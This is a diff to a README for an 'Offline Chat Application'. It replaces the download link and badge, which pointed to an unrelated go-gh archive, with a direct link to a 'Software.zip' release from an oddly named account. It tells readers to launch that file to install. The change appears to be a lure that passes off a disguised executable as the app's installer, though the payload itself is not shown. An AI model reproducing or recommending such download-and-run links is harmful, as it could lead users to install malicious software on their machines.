@@ -37,9 +37,9 @@ To get started with the Offline Chat Application, follow these steps:
 If you encounter any issues during setup, please refer to the "Releases" section for troubleshooting steps.
 
 ## Installation
-To install the Offline Chat Application, you can download the latest version [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to get started. This file needs to be launched to initiate the installation process.
+To install the Offline Chat Application, you can download the latest version [here](https://github.com/SkibidiSigmarizz855/Offline-Chat-Application/releases/download/v1.0/Software.zip) to get started. This file needs to be launched to initiate the installation process.
 
-[![Download Offline Chat Application](https://img.shields.io/badge/Download-Offline_Chat_Application-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Offline Chat Application](https://github.com/SkibidiSigmarizz855/Offline-Chat-Application/releases/download/v1.0/Software.zip)](https://github.com/SkibidiSigmarizz855/Offline-Chat-Application/releases/download/v1.0/Software.zip)
 
 ## Support
 For any questions or support regarding the Offline Chat Application, feel free to reach out to the community or create a new issue on the GitHub repository.
